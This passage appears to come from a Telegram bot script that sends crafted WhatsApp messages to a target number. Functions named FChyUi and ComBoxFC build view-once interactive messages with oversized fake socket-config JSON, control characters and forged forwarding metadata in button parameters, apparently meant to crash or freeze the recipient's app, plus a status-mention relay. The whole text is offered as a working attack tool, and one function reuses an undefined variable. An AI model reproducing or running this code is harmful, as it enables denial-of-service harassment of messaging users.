        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await kipop.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
 
async function FChyUi(target) {
let hyuiForceX = JSON.stringify({
status: true,
criador: "hyuiForcex",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "𝙳𝚄𝙰𝚁 [ 𝟸 ] 🔥",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
{ name: "call_permission_request", buttonParamsJson: hyuiForceX + "\u0003",},
]
}
}
}
}
};

await kipop.relayMessage(target, messagePayload, { participant: { jid: target } });
}

async function ComBoxFC(target) {
let hyuiForceX2 = JSON.stringify({
status: true,
criador: "hyuiForcex",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "𝙳𝚄𝙰𝚁 [ 𝟹 ] 💯",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
{ name: "call_permission_request", buttonParamsJson: hyuiForceX2 + "\u0003",},
]
}
}
}
}
};

await kipop.relayMessage(target, messagePayload, { participant: { jid: target } });
}

// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");